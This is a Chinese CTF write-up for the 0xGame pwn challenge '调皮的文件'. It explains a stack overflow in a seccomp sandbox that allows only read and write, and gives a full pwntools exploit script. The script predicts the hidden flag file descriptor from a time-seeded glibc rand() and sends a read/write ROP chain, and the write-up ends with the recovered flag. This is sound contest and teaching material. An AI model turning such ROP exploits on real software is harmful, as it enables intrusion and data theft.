---
title: "调皮的文件：seccomp 下的文件描述符 ROP"
date: "2026-10-07"
categories: "Pwn"
tags: ["ROP", "seccomp", "文件描述符"]
excerpt: "在只允许 read/write 的沙箱中预测隐藏文件描述符，每次连接构造单 fd ROP 读取结果。"
slug: "pwn-playful-file"
source_event: "0xGame"
---

> 整理自原有本地题解，保留原始结论，未在此次归档中重新运行赛题。复现材料：`pwn`。赛题附件未随文章打包。

## 思路概览

程序先打开 `./flag`，把 flag 文件描述符随机藏到 `3..7`，随后启用 seccomp，只允许 `read` / `write` / `exit` / `exit_group`。利用栈溢出和程序内置 syscall gadgets，预测或逐次尝试隐藏 fd，执行 `read(fd, flag_buf)` 再 `write(1, flag_buf)` 得到 flag。

## 解题过程

### Step 1: 确认漏洞点

`checksec`：No PIE、No Canary、NX enabled、Partial RELRO。`vuln` 中栈缓冲区只有 `0x20` 字节，但读取 `0x200` 字节：

```asm
lea rax, [rbp-0x20]
mov edx, 0x200
mov rsi, rax
mov edi, 0
call read@plt
```

所以返回地址偏移为：`0x20 + saved rbp 0x8 = 0x28`。

`main` 做了三件关键事：

1. `open("./flag", 0)` 先打开 flag；
2. `dup2(flag_fd, rand() % 5 + 3)` 把 flag fd 藏到 `3..7`；
3. 安装 seccomp，后续只能使用 `read` / `write` / `exit` / `exit_group`。

### Step 2: 构造单 fd ROP

程序内置了可直接使用的 gadgets：

```text
0x401303: pop rdi; ret
0x401305: pop rsi; ret
0x401307: pop rdx; ret
0x401309: pop rax; ret
0x40130b: syscall; ret
```

错误 fd 可能是 xinetd/socket 继承的阻塞 fd，因此不要在同一条 ROP 链里盲扫 `3..7`。每次连接只读一个候选 fd：

```c
read(fd, flag_buf, 0x100);
write(1, flag_buf, 0x100);
```

fd 候选优先用 `srand(time(0)); rand() % 5 + 3` 的 glibc 首个 `rand()` 结果预测；若时间有偏差，再回退到 `3..7` 循环尝试。

完整脚本：

```python
from pwn import *
import re
import time

HOST = "challenge.example.invalid"
PORT = 21239

OFFSET_TO_RET = 0x28
FLAG_BUF = 0x4040E0
READ_SIZE = 0x100
FD_RANGE = range(3, 8)
MAX_ROUNDS = 12
RECV_TIMEOUT = 1.0
SEED_DELTAS = (0, 1, -1, 2, -2)

POP_RDI = 0x401303
POP_RSI = 0x401305
POP_RDX = 0x401307
POP_RAX = 0x401309
SYSCALL_RET = 0x40130B
SYS_READ = 0
SYS_WRITE = 1
STDOUT_FD = 1
GLIBC_PM_MOD = 2147483647
GLIBC_PM_MUL = 16807
GLIBC_RAND_STATE_LEN = 344


def first_glibc_rand(seed):
    seed = seed or 1
    state = [0] * GLIBC_RAND_STATE_LEN
    state[0] = seed & 0xFFFFFFFF

    for index in range(1, 31):
        previous = state[index - 1]
        if previous >= 0x80000000:
            previous -= 0x100000000
        state[index] = (GLIBC_PM_MUL * previous) % GLIBC_PM_MOD

    for index in range(31, 34):
        state[index] = state[index - 31]

    for index in range(34, GLIBC_RAND_STATE_LEN):
        state[index] = (state[index - 31] + state[index - 3]) & 0xFFFFFFFF

    return state[-1] >> 1


def fd_from_seed(seed):
    return first_glibc_rand(seed) % len(FD_RANGE) + FD_RANGE.start


def candidate_fds():
    now = int(time.time())
    guessed = [fd_from_seed(now + delta) for delta in SEED_DELTAS]
    return list(dict.fromkeys(guessed + list(FD_RANGE)))


def build_payload(fd):
    chain = [
        POP_RSI, FLAG_BUF,
        POP_RDX, READ_SIZE,
        POP_RAX, SYS_READ,
        POP_RDI, fd,
        SYSCALL_RET,
        POP_RAX, SYS_WRITE,
        POP_RDI, STDOUT_FD,
        SYSCALL_RET,
    ]
    return b"A" * OFFSET_TO_RET + b"".join(p64(word) for word in chain)


def try_fd(fd):
    io = process("./pwn") if args.LOCAL else remote(HOST, PORT)
    io.recvuntil(b"> ")
    io.send(build_payload(fd))
    output = io.recvall(timeout=RECV_TIMEOUT)
    io.close()
    return output


def main():
    context.clear(arch="amd64", os="linux")
    context.log_level = "error"

    for _ in range(MAX_ROUNDS):
        for fd in candidate_fds():
            output = try_fd(fd)
            match = re.search(rb"(?:0xGame|flag|FLAG)\{[^}\r\n\x00]+\}", output)
            if match:
                print(match.group(0).decode())
                return

    raise SystemExit("flag not found")


if __name__ == "__main__":
    main()
```

运行：

```bash
python solve.py
```

验证输出：

```text
0xGame{40b67dc9-49aa-4dd1-bb72-c8463ea115ce}
```

## 最终结果

```text
0xGame{40b67dc9-49aa-4dd1-bb72-c8463ea115ce}
```
